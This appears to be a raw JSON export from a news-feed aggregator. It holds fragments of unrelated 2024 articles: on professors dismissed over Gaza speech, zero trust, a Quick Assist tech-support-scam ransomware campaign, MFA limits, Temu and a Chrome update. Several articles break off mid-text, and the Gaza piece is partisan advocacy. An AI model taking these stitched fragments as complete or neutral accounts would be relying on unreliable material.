his longtime adjunct position. Shaw\u2019s colleagues had moved to reappoint him but were overruled by John Jay President Karol Mason, according to an open letter from the economics department.\n\u201cThe non-reappointment of Danny Shaw is an unacceptable action,\u201d Shaw\u2019s colleagues in the economics department wrote in their open letter. \u201cDanny Shaw is a valuable member of his department who has been teaching at John Jay since 2007. Professor Shaw is an excellent teacher who has received a Distinguished Teaching Award.\u201d\nThe dismissal followed right-wing, pro-Israel online harassment, Shaw said, in response to his showing vocal support for Palestine and opposition to Israel following October 7 and the start of Israel\u2019s bombardments.\n\u201cI saw a genocide in motion, so I began to organize demonstrations and teach-ins and conferences,\u201d Shaw told me.\nOn his X account in mid-October, in the wake of stridently bellicose remarks from Israeli officials, Shaw wrote in a now-deleted post that Zionism \u201cis beyond a mental illness; it\u2019s a genocidal disease.\u201d The target was unambiguously Zionist ideology and its adherents, not Jews for being Jewish. The speech is also clearly within the bounds of First Amendment protections. It was, of course, decried as antisemitic.\nThe pattern is now familiar. Zionist groups like Canary Mission and Antisemitism.org, which have made a business of going after faculty and students online, single out those on campus with pro-Palestine views. Universities then face political and donor pressure to censure the targeted professors.\nMany academics now facing termination, suspension, or having their contracts not renewed told me their open support for Palestinian freedom was nothing new and had never been a significant issue before. \u201cI\u2019ve been doing Palestinian solidarity work since the 1990s when I was a teenager,\u201d Shaw said.\nAt the time John Jay cut ties with Shaw, CUNY was facing increasing pressure from the city and state, with the threat of funding loss tied to trumped-up claims of spiking antisemitism on campus. In late October, New York Gov. Kathy Hochul ordered an independent investigation into antisemitism at CUNY. (A spokesperson for John Jay College said the school can\u2019t comment on personnel matters.)\nCUNY has ended its relationship with at least on other professor because of speech related to Israel\u2019s war on Gaza. One, Lisa Hofmann-Kuroda, a scholar of Japanese literature formerly at CUNY\u2019s Hunter College, told me in a statement that a student reported several of her pro-Palestine social media posts to the head of her department in November. Nothing in the posts, she noted, was antisemitic. \u201cThe only thing I have done,\u201d she said, \u201cis to criticize the state of Israel for its 75-year brutal occupation of Palestine and criticize Americans for their complicity or silence in this genocide.\u201d\nPro-Israel speech incurs consequences much less frequently, but it does happen. In one case, Arizona State University put postdoctoral research fellow Jonathan Yudelman on leave after a video of a pro-Israel rally went viral. In the video, shot near campus in May, Yudelman gets in the face of a woman in a hijab, who says her religious boundaries are being violated. Yudelman replies, \u201cYou disrespect my sense of humanity, bitch.\u201d A statement released by the school last week said that Yudelman \u201cis on leave from Arizona State University pending the outcome of an investigation\u201d into the incident. The statement said that, prior to the event, \u201cYudelman had already resigned his position at ASU, effective June 30, and he was not scheduled to teach any additional courses.\u201d\nYudelman\u2019s case is a rare exception to the rule that treats support for Palestine as a professional liability.\nTenure in the Age of Unsafety\nWhat the late, legendary civil rights attorney Michael Ratner coined as \u201cthe Palestine exception to free speech\u201d is not new, though its escalation in the months since October has been ferocious.\n\u201cRepression of anti-Zionism has a long and ugly history in academe. It really started to pick up after 1967,\u201d Palestinian American scholar and author Steven Salaita told me by email, referring to the period of the 1967 Arab\u2013Israeli War, a time when support for Israel was growing in the U.S. \u201cToo many people to remember have been negatively affected. But it\u2019s worse now than I\u2019ve ever seen it.\u201d\nSalaita was fired for pro-Palestinian speech in 2014, a forerunner for the current repressive moment. After Salaita was let go from a tenured position in American Indian Studies at the University of Illinois over tweets criticizing Israel, a public records request on Salaita\u2019s behalf revealed communications between the university and several wealthy donors threatening to withdraw financial support unless Salaita was fired. The university eventually settled a lawsuit by Salaita for $875,000.\n\u201cI\u2019d say that on the one hand my situation with the University of Illinois a decade ago is exactly like what so many of my colleagues and comrades currently suffer,\u201d Salaita told me. \u201cOn the other hand, my situation was different insofar as I was fired from a tenured professorship, which is highly uncommon.\u201d\nIn recent years, right-wing culture warriors and administrators with their eyes on the bottom line have been trying to find ways to fire tenured professors. As political theorist Joshua Clover, a tenured professor at the University of California, Davis, pointed out, universities for the most part have only been able to achieve this by closing down whole departments on purported economic grounds. The attack of pro-Palestinian speech, though, offers a whole new avenue, under the guise of protecting Jewish students.\nBroad and vague charges of \u201cmaking students feel unsafe\u201d allow universities to scrutinize everything a professor does, inside or outside of the classroom. Clover, who has himself been targeted by Canary Mission for anti-Zionist speech, told me this enables \u201cextramural speech to be treated as something relevant to people\u2019s work situation.\u201d\n\u201cThere\u2019s nothing extramural anymore,\u201d he said. \u201cWe\u2019re all at work 24 hours a day, wherever we are.\u201d\nIt was extramural speech \u2014 an essay for a leftist publisher \u2014 that earned a suspension from teaching for Jodi Dean, a tenured political theorist at Hobart and William Smith Colleges in New York, where she has taught for 30 years. (She remains employed at the university.) Her essay was condemned for describing seeing images of the breach of the Gaza wall on October 7 as \u201cexhilarating,\u201d and the college president said in a letter that there \u201cmay be students on our campus who may feel threatened in or outside of the classroom.\u201d\n\u201cI have been here for 20 years and I haven\u2019t seen anything like this,\u201d Paul Passavant, a professor of politics at Hobart and William Smith, told Middle East Eye of Dean\u2019s suspension. \u201cIt is a total violation of academic freedom. And it violates the integrity of the institution as an academic institution.\u201d\nIn response to requests for comment, a Hobart and William Smith spokesperson forwarded three letters from university leadership that had been sent out to the college community in mid-April.\n\u201cProfessor Dean has the right to express her views,\u201d the school\u2019s provost and dean of faculty Sarah Kirk wrote in an April 15 letter. \u201cIt is also true that Hobart and William Smith has the obligation under federal anti-discrimination laws, including Title VI, to investigate and take prompt action where the possibility exists that there is a hostile environment based on national origin, shared ancestry, or other protected classes that may interfere with a student\u2019s ability to learn and enjoy the benefits of an education.\u201d The letters all say that Dean has been \u201crelieved\u201d of classroom duties while she is under investigation by the school.\nActivist and scholar Amin Husain likewise was punished for extramural speech. He had called for Palestinian liberation for many years, but he was only suspended from his adjunct position at New York University in January of this year.\n\u201cI\u2019ve been teaching for seven or eight years. Never one complaint.\u201d\nHusain told me that the university\u2019s human resources department questioned him not only about his anti-Zionist statements, but also about social media content posted by an abolitionist art collective, Decolonize This Space, that he is affiliated with. None of the collective\u2019s posts were attributed to Husain specifically.\n\u201cI\u2019ve been teaching for seven or eight years. Never one complaint,\u201d Husain told me. He added that his suspension was not the result of a student complaint but evidence taken from \u201cdoxing outlets.\u201d While he is technically suspended, Husain is an adjunct with a contract ending this month. (NYU did not respond to a request for comment.)\n\u201cI\u2019m never going to be hired by NYU,\u201d he told me. Of the university, he said, \u201cYou destroyed my reputation, and you never even did the due diligence.\u201d\nA letter of support for Husain, signed by over 2,000 artists, writers, academics, and students, said, \u201cThese attacks on speech (and speakers) reflect the ideology behind the logic of destruction inflicted on the cultural infrastructure of Palestine itself.\u201d\n\u201cNow Is the Time\u201d\nThe issue of academic freedom on Palestine is inseparable from the labor struggles that have been rocking universities over the past decade.\n\u201cUntil recently, labor unions in this country have been incredibly weak, the impact of which is emboldened university leaders who are enacting increasingly repressive policies on their campuses,\u201d Molly Ragan, a union organizer with UAW Local 7902, who teaches at the Parsons School of Design, part of the New School university. \u201cWhat I\u2019ve learned in my two years as a UAW staff organizer working with faculty and student workers in NYC is that the labor movement and pro-Palestine movement go hand in hand.\u201d\nAlongside the New School\u2019s Students for Justice in Palestine chapter, two student worker unions, both unionized with the UAW, organized the student-led encampment on campus. Two weeks ago, that protest camp was cleared out in a surprise police raid involving over 40 arrests.\nRagan noted that labor involvement aimed to provide \u201ca legal shield for the encampment because any retaliation is a violation of our basic Section 7 right to concerted activity under the NLRA\u201d \u2014 a reference to the National Labor Relations Act\u2019s protection of workplace collective action. On Monday, ACT-UAW Local 7902 filed an unfair labor practice charge against the school over the arrests on campus and treatment of the encampment participants.\nThe importance of supporting scholars who speak out for Palestine, however, goes far beyond free speech and worker protections. Israel\u2019s occupation and its ongoing brutal war are constant reminders of the more salient issues at work.\n\u201cIf silence is the desired outcome, then Zionist organizations are failing miserably.\u201d\nDespite continuous police raids, the protest camps are spreading. Nearly 200 campuses nationwide established encampments in the last month to demand divestment from Israel, its military apparatus, and the corporations that benefit from it.\n\u201cI don\u2019t think the repression will work, not if its ultimate goal is to keep people quiet. If the goal is punishment in and of itself, then the tactic is effective,\u201d Salaita, the scholar, told me. \u201cBut if silence is the desired outcome, then Zionist organizations are failing miserably, and will continue to fail miserably. Nobody\u2019s going to stop talking about Palestine at this point.\u201d\nClover, the Davis professor, echoed the sentiment. \u201cIf you\u2019re going to be fired for standing up for Palestine, now is the time to do it anyway,\u201d Clover said. \u201cNow is the time to do it in the most serious and principled ways.\u201d\nNowhere is this principled defiance better exemplified than among the Palestinian scholars who have lost the most.\n\u201cWe will never tire, be frightened, or threatened to stop advocating for justice and peace and to stop the ongoing slaughter and genocide in Palestine,\u201d Ahmed Alhussaina, the vice president of Israa University, one of Gaza\u2019s most celebrated institutions of higher education and research, told me by email.\n\u201cIt\u2019s really a shame to witness such a disgrace in the American political system,\u201d said Alhussaina. \u201cThere is a McCarthyite campaign to silence the Palestinian voice in all American universities, large and small, but there is broad determination and support for Gaza and Palestine in all universities, and it will be difficult to contain this youth tide.\u201d\nAlhussaina, who has lost 102 relatives to Israel\u2019s onslaught, fled Gaza in November. At the start of the war, the Israeli military seized his university and turned it into a barracks and a detention center, before destroying it in a massive, controlled explosion.", "hash": "804ad393d0156c527b77fb23c31ac016d0a4f36dd35671116273a067854c54a2", "id": "ee38c864-da9f-405f-bf4f-1ff0fa316d63", "link": "https://theintercept.com/2024/05/16/university-college-professors-israel-palestine-firing/", "osint_source_id": "a87d9c83-841f-455b-9e28-f8d5df3a6fb5", "published": "2024-05-16T09:00:00", "source": "https://theintercept.com/feed/?rss", "story_id": "f7245a1c-4beb-4b96-8497-83097a2efbed", "title": "University Professors Are Losing Their Jobs Over \u201cNew McCarthyism\u201d on Gaza"}], "tags": {"Abdou": {"name": "Abdou", "tag_type": "PER"}, "African": {"name": "African", "tag_type": "MISC"}, "Ahmed Alhussaina": {"name": "Ahmed Alhussaina", "tag_type": "PER"}, "Alhussaina": {"name": "Alhussaina", "tag_type": "PER"}, "American": {"name": "American", "tag_type": "MISC"}, "Amin Husain": {"name": "Amin Husain", "tag_type": "PER"}, "Anita Levy": {"name": "Anita Levy", "tag_type": "PER"}, "Canada": {"name": "Canada", "tag_type": "Country"}, "Clover": {"name": "Clover", "tag_type": "PER"}, "Columbia": {"name": "Columbia", "tag_type": "LOC"}, "Congress": {"name": "Congress", "tag_type": "ORG"}, "Egypt": {"name": "Egypt", "tag_type": "Country"}, "Eurocentric": {"name": "Eurocentric", "tag_type": "MISC"}, "Facebook": {"name": "Facebook", "tag_type": "MISC"}, "Gaza": {"name": "Gaza", "tag_type": "LOC"}, "Gaza Strip": {"name": "Gaza Strip", "tag_type": "LOC"}, "Hamas": {"name": "Hamas", "tag_type": "ORG"}, "Husain": {"name": "Husain", "tag_type": "PER"}, "Islam": {"name": "Islam", "tag_type": "MISC"}, "Islamophobia": {"name": "Islamophobia", "tag_type": "MISC"}, "Israa University": {"name": "Israa University", "tag_type": "ORG"}, "Israel": {"name": "Israel", "tag_type": "Country"}, "Israeli": {"name": "Israeli", "tag_type": "MISC"}, "Japanese": {"name": "Japanese", "tag_type": "MISC"}, "Jewish": {"name": "Jewish", "tag_type": "MISC"}, "Latin American": {"name": "Latin American", "tag_type": "MISC"}, "Levy": {"name": "Levy", "tag_type": "PER"}, "McCarthyism": {"name": "McCarthyism", "tag_type": "MISC"}, "McCarthyite": {"name": "McCarthyite", "tag_type": "MISC"}, "Minouche Shafik": {"name": "Minouche Shafik", "tag_type": "PER"}, "Mohamed Abdou": {"name": "Mohamed Abdou", "tag_type": "PER"}, "Molly Ragan": {"name": "Molly Ragan", "tag_type": "PER"}, "NLRA": {"name": "NLRA", "tag_type": "ORG"}, "NYC": {"name": "NYC", "tag_type": "LOC"}, "NYU": {"name": "NYU", "tag_type": "ORG"}, "Palestine": {"name": "Palestine", "tag_type": "LOC"}, "Palestinian": {"name": "Palestinian", "tag_type": "MISC"}, "Ragan": {"name": "Ragan", "tag_type": "PER"}, "Republican": {"name": "Republican", "tag_type": "MISC"}, "Salaita": {"name": "Salaita", "tag_type": "PER"}, "Shafik": {"name": "Shafik", "tag_type": "PER"}, "Sharia": {"name": "Sharia", "tag_type": "MISC"}, "U.S.": {"name": "U.S.", "tag_type": "LOC"}, "UAW": {"name": "UAW", "tag_type": "ORG"}, "United Nations": {"name": "United Nations", "tag_type": "ORG"}, "Vietnam": {"name": "Vietnam", "tag_type": "Country"}, "Zionist": {"name": "Zionist", "tag_type": "MISC"}, "anti-Arab": {"name": "anti-Arab", "tag_type": "MISC"}, "anti-Israel": {"name": "anti-Israel", "tag_type": "MISC"}, "anti-Muslim": {"name": "anti-Muslim", "tag_type": "MISC"}, "anti-Zionist": {"name": "anti-Zionist", "tag_type": "MISC"}, "pro-Israel": {"name": "pro-Israel", "tag_type": "MISC"}, "pro-Palestine": {"name": "pro-Palestine", "tag_type": "MISC"}}, "title": "University Professors Are Losing Their Jobs Over \u201cNew McCarthyism\u201d on Gaza"}, {"attributes": [{"created": "2024-05-16T17:08:38.024277", "id": "09ce05ec-fc1a-441f-a988-2d9deda33f51", "key": "WORDLIST_BOT", "value": "1"}, {"created": "2024-05-16T17:14:00.709128", "id": "1686466d-122e-40c1-99bf-055bda99f6dd", "key": "NLP_BOT", "value": "11"}], "created": "2024-05-16T09:00:00", "id": "d9cc6ad3-4781-4b69-9062-74f6274b22f4", "news_items": [{"author": "", "content": "The concept of zero trust is not new. In fact, the primary characteristics have been cybersecurity best practices for decades. And more importantly, zero trust is not a product or something you can buy, but rather a strategy, policy, and workflow for implementing access from assets to data that encapsulates the best security traits possible.\nThe concept of zero trust has emerged due to the evolving threat landscape that targets vulnerabilities, exploits, misconfigurations, and identity security. It has become mainstream since traditional security measures prove inadequate, and a better method was needed to mitigate the risks every organization faces today.\nZero trust isn't merely a buzzword; it's a fundamental shift in how we approach cybersecurity for the long haul. This blog aims to clarify what zero trust is by defining its core components: Zero Trust (ZT), Zero Trust Architecture (ZTA), and Zero Trust Network Access (ZTNA). In addition, it will delve into the nuances of each concept, highlighting their differences and significance in securing modern networks regardless of whether they are used on-premises or for remote access.\nWhat is zero trust?\nAt its core, zero trust is a security model that operates on the principle of \"Never trust, always verify\" and provides a measure of confidence in doing so. Unlike traditional security paradigms that rely on network and perimeter-based defenses and access control lists, zero trust postulates that threats can exist both outside and inside the network perimeter, and nothing is safe without verification. Simply stated, it treats every access attempt as potentially malicious until proven otherwise, regardless of the user's location, asset, or workflow.\nZero trust advocates for granular access controls and strict enforcement of least privilege principles to minimize the attack surface and mitigate risks while continuously monitoring all aspects for anomalous communications and user behavior. The primary goal, bluntly stated, is that, if any security incident does occur after all of these principles are applied, it can be contained, managed, and will prevent a beachhead or lateral movement.\nWhat is a Zero Trust Architecture (ZTA)?\nA Zero Trust Architecture encompasses the framework, principles, and technologies that enable organizations to implement the zero trust model effectively. It essentially applies products, solutions, policies, and workflows in a cohesive architecture to attain the goals of zero trust. Therefore, in today\u00e2s world, a single product from a single vendor does not represent zero trust, but rather just one component of the ultimate goal. Zero trust architectures extend beyond traditional security controls to embody a holistic security strategy that encompasses users, devices, applications, and data. Key components of any zero-trust architecture include:\nMicro-segmentation: Dividing the network, access, data, and running processes into smaller segments and enforcing strict, localized access controls (privileges, permissions, entitlements, and rights) between them to contain breaches and limit lateral movement by attackers.\n-\nIdentity and Access Management (IAM): Implementing robust authentication mechanisms, such as multi-factor authentication (MFA), and centralized identity governance and privileged management to provide a high level of continuous confidence in a users' identities.\n-\nContinuous Monitoring: Leveraging real-time analytics and behavioral analysis to detect anomalies, suspicious activities, and potential threats across the network from inappropriate behavior.\n-\nEncryption: Encrypting data both at rest and in transit to ensure confidentiality and integrity, especially in multi-cloud, hybrid environments, or during remote access when traditional network security controls cannot be adequately enforced.\n-\nPolicy Orchestration: Automating the enforcement of security policies based on dynamic factors, such as user roles, device posture, and contextual information, across all layers of an entire workflow.\n-\nWhat is Zero Trust Network Access (ZTNA)?\nZero Trust Network Access is commonly referred to as \"perimeter-less security\u00e2 and is a specific implementation of the zero-trust model focused on securing remote access to an organization's assets. Zero trust network access has the dubious honor of being branded a product, but as previously discussed, is another component of a true zero trust environment governing network access.\nThese solutions leverage identity-centric access controls and least privilege principles to authenticate users and grant them access to specific applications or services, regardless of their location or network environment. They alone contain only a partial list of all the traits needed to be a complete zero trust ecosystem, despite vendors marketing them as such. As a reference for their capabilities, traditional Virtual Private Networks (VPNs) typically provide blanket access to the entire network, while zero trust network access solutions offer more granular control, reducing the risk of unauthorized access and lateral movement by threat actors.\nAt the network layer, they cannot monitor session-based user behavior, continuously monitor identity confidence, nor prevent lateral movement downstream. Therefore, solutions marketed today are only part of the problem.\nWhile zero trust network access represents just one potential implementation of zero trust and zero trust architectures, security professionals should be aware that other implementations could include zero trust application access, zero trust session management, etc. Each one follows a percentage of the required guidelines to be labeled zero trust and solves a unique use case for access and authentication-based technologies.\nZero trust vs ZTA vs ZTNA: comparisons and differences\nWhile zero trust, zero trust architectures, and zero trust network access share the overarching goal of enhancing cybersecurity posture, they differ in scope, emphasis, and implementation:\n1. Scope:\nZero Trust is a security model based on the principle of \"never trust, always verify,\" applicable to all aspects of cybersecurity.\n-\nZero Trust Architectures provide a comprehensive framework encompassing network segmentation, identity management, encryption, and policy orchestration to operationalize the zero trust model.\n-\nZero Trust Network Access is just one of many potential zero trust implementations that focuses on securing remote access to corporate resources, emphasizing identity-centric access controls and least privilege principles. The concept is one of the first zero trust architectures to be partially commercialized in products.\n-\n2. Emphasis:\nZero Trust centers on redefining the traditional perimeter-based security model, emphasizing continuous verification, and enforcing strict access controls regardless of where assets and data, and sources and destinations reside.\n-\nZero Trust Architectures emphasizes the design and implementing of a holistic security framework that aligns with zero trust principles, encompassing network, identity, data, and application security.\n-\nZero Trust Network Access is the first major practical implementation that emphasizes the need to secure remote access to organizational resources for all identities, along with the principle of \"verify first, access later,\" irrespective of the user's location or trusted device.\n-\n3. Implementation:\nZero Trust can be implemented through a combination of policy changes, technology deployments, and workflow changes within an organization.\n-\nZero Trust Architectures can be implemented through a structured approach involving network, data, and application segmentation; identity management; encryption; continuous monitoring; and continuous policy enforcement controls.\n-\nZero Trust Network Access can be implemented through specialized solutions that authenticate users, authorize access based on identity and context, and enforce least privilege principles for remote access. And as a reminder, this is only a partial list of true characteristics to achieve zero trust end to end for any given workflow.\n-\nOperationalizing Zero Trust, ZTA, & ZTNA\nZero trust represents a paradigm shift in cybersecurity, advocating for a proactive, identity-centric approach to security through new access controls and continuous monitoring of access and identity behavior. Zero trust Architectures provide the framework and principles necessary to operationalize zero trust effectively through any workflow from remote access to cloud access and beyond. Essentially any access workflow can be envisioned in a zero-trust paradigm.\nAnd finally, while zero trust network access offers a specialized solution for securing remote access in an increasingly decentralized environment by using strict point-to-point encrypted access. By understanding the nuances and differences between zero trust, zero trust architectures, and zero trust network access, organizations can embark on the journey towards a more resilient and adaptive security posture in the face of evolving cyber threats.\nClick here to learn how to implement and advance your zero trust security posture to meet today\u00e2s evolving threats, and sign up here to watch our webinar on the challenges and strategies of achieving zero trust in the cloud.\nBlog\nUnderstanding the New NSA Guidance on Zero Trust\nWhitepapers\nAdvancing Zero Trust with Privileged Access Management (PAM)\nWhitepapers\nMapping BeyondTrust Capabilities to NIST Zero Trust (SP 800-207)\nMorey J.

It comes installed by default on devices running Windows 11.\nTo make the attacks more convincing, the threat actors launch link listing attacks, a type of email bombing attack in which the targeted email addresses are signed up for various legitimate email subscription services to flood their inboxes with subscribed content.\nThe adversary then masquerades as the company's IT support team through phone calls to the target user, purporting to offer assistance in remediating the spam issue and persuading them to grant access to their device through Quick Assist.\n\"Once the user allows access and control, the threat actor runs a scripted cURL command to download a series of batch files or ZIP files used to deliver malicious payloads,\" the Windows maker said.\n\"Storm-1811 leverages their access and performs further hands-on-keyboard activities such as domain enumeration and lateral movement. Storm-1811 then uses PsExec to deploy Black Basta ransomware throughout the network.\"\nMicrosoft said it's taking a close look at the misuse of Quick Assist in these attacks and that it's working on incorporating warning messages in the software to notify users of possible tech support scams that could facilitate ransomware delivery.\nThe campaign, believed to have commenced in mid-April 2024, has targeted a variety of industries and verticals, including manufacturing, construction, food and beverage, and transportation, Rapid7 said, indicating the opportunistic nature of the attacks.\n\"The low barrier of entry into conducting these attacks, coupled with the significant impacts these attacks have on their victims, continue to make ransomware a very effective means to an end for threat actors seeking a payday,\" Robert Knapp, senior manager of incident response services at Rapid7, said in a statement shared with The Hacker News.\nMicrosoft has also described Black Basta as a \"closed ransomware offering\" as opposed to a ransomware-as-a-service (RaaS) operation that comprises a network of core developers, affiliates, and initial access brokers who conduct ransomware and extortion attacks.\nIt is \"distributed by a small number of threat actors who typically rely on other threat actors for initial access, malicious infrastructure, and malware development,\" the company said.\n\"Since Black Basta first appeared in April 2022, Black Basta attackers have deployed the ransomware after receiving access from QakBot and other malware distributors, highlighting the need for organizations to focus on attack stages prior to ransomware deployment to reduce the threat.\"\nOrganizations are recommended to block or uninstall Quick Assist and similar remote monitoring and management tools if not in use and train employees to recognize tech support scams.", "hash": "428dbb436221ecb990962a60b033120f214f419338d883c5b3c4b5cb9dde7264", "id": "ffa44fc7-440b-4999-8bc1-84464434e83b", "link": "https://thehackernews.com/2024/05/cybercriminals-exploiting-microsofts.html", "osint_source_id": "ef5f3f17-365f-4dfb-889d-5a3ef3bdfff0", "published": "2024-05-16T08:46:00", "source": "http://feeds.feedburner.com/TheHackersNews", "story_id": "91fba240-22c5-4307-9dcb-d6ed2fa092bb", "title": "Cybercriminals Exploiting Microsoft\u2019s Quick Assist Feature in Ransomware Attacks"}], "tags": {"Black Basta": {"name": "Black Basta", "tag_type": "ORG"}, "Incident response": {"name": "Incident response", "tag_type": "Cybersecurity"}, "Microsoft": {"name": "Microsoft", "tag_type": "ORG"}, "PsExec": {"name": "PsExec", "tag_type": "ORG"}, "QakBot": {"name": "QakBot", "tag_type": "MISC"}, "RaaS": {"name": "RaaS", "tag_type": "ORG"}, "Rapid7": {"name": "Rapid7", "tag_type": "ORG"}, "Robert Knapp": {"name": "Robert Knapp", "tag_type": "PER"}, "Windows 11": {"name": "Windows 11", "tag_type": "MISC"}, "phishing": {"name": "phishing", "tag_type": "Cybersecurity"}, "ransomware": {"name": "ransomware", "tag_type": "Cybersecurity"}}, "title": "Cybercriminals Exploiting Microsoft\u2019s Quick Assist Feature in Ransomware Attacks"}, {"attributes": [{"created": "2024-05-16T09:08:43.292639", "id": "028c1de9-3b06-4057-aa9f-1a1df0ecb70c", "key": "WORDLIST_BOT", "value": "1"}, {"created": "2024-05-16T09:10:11.421195", "id": "31bcb961-325c-4a54-8437-7574fbe5c53e", "key": "NLP_BOT", "value": "6"}], "created": "2024-05-16T08:40:01", "id": "f306a988-8131-4fcb-8bb7-f88c3e65f944", "news_items": [{"author": "", "content": "Online-H\u00e4ndler Temu ger\u00e4t in der EU unter Bedr\u00e4ngnis\nVerbrauchersch\u00fctzer*innen in mehreren europ\u00e4ischen L\u00e4ndern haben Beschwerde gegen den chinesischen Onlineh\u00e4ndler Temu eingereicht. \"Der Online-Marktplatz ist voll von manipulativen Techniken, die darauf abzielen, die Verbraucherinnen und Verbraucher dazu zu bringen, mehr auf der Plattform auszugeben\", erkl\u00e4rte die Chefin der europ\u00e4ischen Vebraucherorganisation BEUC, Monique Goyens, am Donnerstag.

They delved into the unique aspects of Hexagon\u2019s latest innovations and strategies, particularly in managing data, technology, and human resources amidst evolving industrial challenges. Hexagon, renowned for its pioneering solutions, demonstrated how it harnesses technology to elevate operational efficiency and quality in manufacturing.\nEmbracing Software and AI in Manufacturing\nJohannes underscored a significant shift at this year\u2019s Hannover Messe, where there was a noticeable increase in booths and exhibitors focusing on software solutions, driven by AI. This shift reflects an industry-wide movement towards addressing macro challenges such as workforce skill gaps and increasing customer demands for quality. Hexagon, at the forefront of this movement, is demonstrating its commitment to addressing these challenges in industrial sectors like automotive and aerospace, which have traditionally focused on heavy machinery.\nThe Power of Integration: Hexagon\u2019s Breo System\nA key part of Hexagon\u2019s showcase was the PRESTO system, which exemplifies the company\u2019s approach to combining existing technological capabilities to meet contemporary industrial challenges. PRESTO integrates technologies such as laser scanning and tracking with robot programming to create sophisticated yet user-friendly systems that enhance productivity and precision in manufacturing processes.\nDemocratizing Robot Programming\nAddressing the needs of small to medium-sized enterprises (SMEs), Johannes explained how Hexagon is making advanced automation technologies more accessible. Recognizing that SMEs often lack the resources for complex robot programming, Hexagon has developed solutions that simplify the integration of automation technologies into their operations. The PRESTO modular, for instance, is a robotic measuring cell that allows for easy operation without the need for extensive programming expertise. This innovation not only lowers the barrier to entry for using advanced manufacturing technologies but also makes it feasible for smaller manufacturers to enhance their precision and efficiency.\nNexus: An Open Innovation Platform\nExpanding on Hexagon\u2019s initiatives, Johannes talks about Nexus, an open innovation platform designed to foster collaboration across geographic and departmental boundaries. Nexus plays a pivotal role in Hexagon\u2019s strategy to effectively utilize data, enabling real-time access and collaboration. This, in turn, enhances decision-making processes and operational agility, thereby illustrating the significant impact of Hexagon\u2019s initiatives on the manufacturing industry.\nFor more details, watch the video.\nThe interview was recorded by Greg Orloff during the Hannover Messe 2024.

Yet, despite its efficacy, MFA is not impervious to exploitation. Recognizing the avenues through which hackers bypass these defences is crucial for fortifying cybersecurity measures.\nMultifactor authentication (MFA) stands as a stalwart defence in today\u2019s cybersecurity landscape. Yet, despite its efficacy, MFA is not impervious to exploitation. Recognizing the avenues through which hackers bypass these defences is crucial for fortifying cybersecurity measures.\nLet us first reiterate where the good things about MFA really come into their own. Multi-factor authentication (MFA) offers several advantages over traditional single-factor authentication methods:\nImproved security: MFA adds an extra layer of security by requiring users to provide multiple forms of verification, typically something they know (like a password) and something they have (like a smartphone for receiving a verification code or a physical security token ).\nReduced risk of unauthorized access: With MFA, even if a hacker manages to obtain a user's password, they would still need the additional factor (such as a code generated on a trusted device) to gain access. This makes it much harder for unauthorized individuals to breach accounts.\nMitigation of credential theft: MFA helps mitigate the risk of credential theft through methods like phishing or brute-force attacks. Even if attackers acquire a user's password, they would still need the second factor to successfully authenticate.\nCompliance requirements: Many regulatory standards and industry best practices require organizations to implement MFA to enhance security and protect sensitive information. Adhering to these requirements helps organizations avoid penalties and maintain compliance.\nUser-friendly: While additional steps may seem burdensome at first, many MFA implementations are designed with user convenience in mind. Methods such as push notifications or biometric authentication can provide a seamless and user-friendly experience while maintaining security.\nAdaptability and flexibility: MFA can be implemented across various platforms and devices, making it adaptable to different environments and user preferences. Whether accessing corporate networks, cloud services, or personal accounts, MFA can enhance security across the board.\nEarly threat detection: Some advanced MFA systems incorporate behavioural analytics and anomaly detection. These features can help identify suspicious login attempts based on factors such as unusual device locations or access patterns, allowing organizations to respond to potential threats more quickly.\nOverall, MFA is an effective strategy for bolstering security in an increasingly digital and interconnected world, providing a critical defence against a wide range of cyber threats. Given those benefits if is suprising how little adaptation the technology has found across the board.\nHowever, having sung its praise, we should also take close a look at where the limitations of this technologies lie. Attackers can bypass MFA with some tried and tested techniques. Sure, a 90 % success rate in thwarting attacks may sound like excellent news. Which it is. But this still leaves a significant room for exploitation, given the scale of cybercrime. Even if 90 out of 100 attacks end up fizzling out \u2013 that leaves 10 attacks that still succeed despite the boost in security.\nHere are several tactics cybercriminals employ to sidestep MFA:\nWhile indispensable, MFA alone cannot guarantee impregnable security. If the authentication mechanism, however strong and well-designed it might be, is doing all the heavy lifting, then issues are going to crop up. Augmenting MFA with robust access controls is imperative to fortify organizational defenses against evolving cyber threats.\nFight social engineering: Mitigate phishing threats through comprehensive employee training initiatives. Equipping staff with the skills to discern and report phishing attempts diminishes the efficacy of social engineering tactics. This is where a good cybersecurity training is able to truly shine.\nBy comprehensively understanding MFA vulnerabilities and implementing proactive countermeasures, organizations can fortify their cybersecurity posture and safeguarding critical assets against malicious exploitation. The last word about MFA hasn\u2019t been said. Let\u2019s see how robust MFA will be against future attacks.", "hash": "a0e026c8329ea549624c77e557793abe50af22e1b003c16598f3af1ef1b685cc", "id": "5c829012-e0ef-4b97-9e8e-0ab94b487dd7", "link": "https://feeds.feedblitz.com/~/896689175/0/gdatasecurityblog-en~Multifactor-Authentication-Great-tool-with-some-limitations", "osint_source_id": "74a2b488-13cd-4356-8b8c-947c39ca980d", "published": "2024-05-16T07:54:00", "source": "https://feeds.feedblitz.com/gdatasecurityblog-en&x=1", "story_id": "295acb65-098b-4bc0-9cd5-ff57c860e413", "title": "Multifactor Authentication: Great tool with some limitations"}], "tags": {"MFA": {"name": "MFA", "tag_type": "MISC"}, "Multi-factor authentication": {"name": "Multi-factor authentication", "tag_type": "Cybersecurity"}, "phishing": {"name": "phishing", "tag_type": "Cybersecurity"}}, "title": "Multifactor Authentication: Great tool with some limitations"}, {"attributes": [{"created": "2024-05-16T09:08:54.742025", "id": "10de1573-fbbf-49f4-a4ce-a246387a9e68", "key": "WORDLIST_BOT", "value": "1"}, {"created": "2024-05-16T09:10:39.453638", "id": "5e7d7838-c4fc-4de4-98f8-ef909f4c9cbe", "key": "IOC_BOT", "value": "4"}, {"created": "2024-05-16T09:14:34.241488", "id": "7e1397f6-7009-4524-8419-ba8de2334fdb", "key": "NLP_BOT", "value": "9"}], "created": "2024-05-16T07:54:00", "id": "469d276d-919e-4af9-b8cb-d07d2085eac8", "news_items": [{"author": "Dirk Knop", "content": "Chrome: Weitere Zero-Day-L\u00fccke mit Update geschlossen\nZum dritten Mal innerhalb einer Woche aktualisiert Google den Chrome-Webbrowser.

